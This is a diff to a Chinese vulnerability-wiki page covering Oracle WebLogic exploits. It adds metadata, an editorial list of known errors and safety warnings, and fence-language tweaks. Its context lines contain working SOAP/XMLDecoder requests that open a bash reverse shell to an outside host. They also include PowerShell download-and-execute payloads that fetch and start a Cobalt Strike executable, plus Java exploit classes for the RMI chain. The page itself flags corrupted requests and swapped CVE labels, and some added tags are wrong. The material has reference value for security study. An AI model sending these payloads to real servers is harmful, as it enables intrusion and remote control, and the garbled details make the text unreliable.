@@ -1,9 +1,66 @@
 ---
 version: "10.3.6.0"
 source: "MrWQ/vulnerability-paper"
+title: "weblogic 中间件漏洞总结"
+product: "Oracle WebLogic, custom configuration and Redis chain"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "active"
+primary_identifiers: "CVE-2017-10271; CVE-2017-3506; CVE-2019-2725; CVE-2018-2628; CVE-2018-2894; CVE-2014-4210; CVE-2020-14882; CVE-2020-14883; CVE-2020-2551"
+referenced_identifiers: "CVE-2015-4852; CVE-2016-0638; CVE-2016-3510; CVE-2017-3248; CVE-2018-2893"
+identifier_role: "primary"
+cve: "CVE-2017-10271; CVE-2017-3506; CVE-2019-2725; CVE-2018-2628; CVE-2018-2894; CVE-2014-4210; CVE-2020-14882; CVE-2020-14883; CVE-2020-2551"
+prerequisites: "Distinct per section: unpatched SOAP, T3/IIOP, enabled test pages, weak admin credentials, or privileged unauthenticated Redis"
+affected_versions: "10.3.6.0"
+source_url: "https://mp.weixin.qq.com/s/6X_JEveVf7R6acxCdD0sDg"
+source_status: "recorded"
+side_effects: "含计划任务、启动项或 SSH 授权文件写入：会改变后续执行或登录行为。测试前备份原文件，结束后恢复原内容、权限与属主，不覆盖生产文件。; 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。; 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。; 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。"
+id: "vw-b652d2e82dd178d3d0f0ea86"
+entity_id: "ve-b652d2e82dd178d3d0f0ea86"
+schema_version: "1"
 ---
 
 # weblogic 中间件漏洞总结
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+- 适用前提：Distinct per section: unpatched SOAP, T3/IIOP, enabled test pages, weak admin credentials, or privileged unauthenticated Redis
+- 证据范围：Full 37,814-character Markdown read in overlapping parts. Independent Windows/Linux lab screenshots add evidence but many repeated recipes and serious labels/detection/remediation errors require section-level normalization.
+
+### 本次正文校订
+
+- 按实际内容修正 5 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- 14882 and 14883 roles reversed in reproduction headings
+- SOAP/async/UDDI endpoint200 or ordinary response repeatedly asserted as proof of vulnerability; ignores patches
+- HTTP404 incorrectly interpreted as non-HTTP protocol, and Redis6379 incorrectly called HTTP
+- ConnectionFilterImpl selection without actual deny rules does not block T3
+- Several HTTP requests collapsed and XML includes unescaped ampersands or missing attribute separators; Java/JSP contains backslash-brace corruption
+- Spring XML starts with literal ## poc.xml and therefore invalid as shown
+- Root cron write chain omits permissions/protected-mode/CONFIG restrictions and destructive overwrite warning
+- 10271 object-tag write needs earlier3506 patch distinction; version lists incomplete/inconsistent between sections
+- Installation command includes unsafe broad rm -rf /usr/bin/java*, third-party JDK download and unpinned environments
+- Generic current/latest version claims are historical, developer versus production test-page auth conditions require clearer scope
+- No removal of uploaded JSP, downloaded executables, cron change or configuration restoration
+
+### 操作风险与资料使用
+
+- 含计划任务、启动项或 SSH 授权文件写入：会改变后续执行或登录行为。测试前备份原文件，结束后恢复原内容、权限与属主，不覆盖生产文件。
+- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。
+- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。
+- 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/6X_JEveVf7R6acxCdD0sDg)
@@ -198,13 +255,13 @@ C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_
 
 实现 Linux 反弹 shell 的 poc：
 
-```
+```http
 POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: x.x.x.x:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 637<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>/bin/bash</string></void><void index="1"><string>-c</string></void><void index="2"><string>bash -i >& /dev/tcp/x.x.x.x/4444 0>&1</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
 ```
 
 实现 win 上线 cs
 
-```
+```http
 POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.10.154:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 704<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"> <soapenv:Header><work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/"><java version="1.4.0" class="java.beans.XMLDecoder"><void class="java.lang.ProcessBuilder"><array class="java.lang.String" length="3"><void index="0"><string>powershell</string> </void> <void index="1"> <string>-Command</string> </void> <void index="2"> <string>(new-object System.Net.WebClient).DownloadFile('http://192.168.10.65/zcc.exe','zcc.exe');start-process zcc.exe</string></void></array><void method="start"/></void></java></work:WorkContext></soapenv:Header><soapenv:Body/></soapenv:Envelope>
 ```
 
@@ -577,7 +634,7 @@ An error has occurred<BR>weblogic.uddi.client.structures.exception.XML_SoapExcep
 
 这里查一下开启 redis 服务的这个容器 IP，找到 ip：172.20.0.2
 
-```
+```shell
 docker inspect a5a
 ```
 
@@ -754,7 +811,7 @@ cd /optcurl http://www.joaomatosf.com/rnp/java_files/jdk-8u20-linux-x64.tar.gz -
 
 exp.java 代码
 
-```
+```python
 import java.io.IOException;public class exp { static{  try {   java.lang.Runtime.getRuntime().exec(new String[]{"cmd","/c","calc"});  } catch (IOException e) {   e.printStackTrace();  } } public static void main(String[] args) {   \}\}
 ```
 
@@ -794,7 +851,7 @@ java -jar weblogic_CVE_2020_2551.jar 192.168.0.105 7001 rmi://192.168.0.108:1234
 
 同理，上线 cs 的话，只需改 exp.java 代码即可，后续步骤一样
 
-```
+```python
 import java.io.IOException;public class exp { static{  try {   java.lang.Runtime.getRuntime().exec(new String[]{"powershell","/c"," (new-object System.Net.WebClient).DownloadFile('http://x.x.x.x/zcc.exe','zcc.exe');start-process zcc.exe"});  } catch (IOException e) {   e.printStackTrace();  } } public static void main(String[] args) {   \}\}
 ```
 
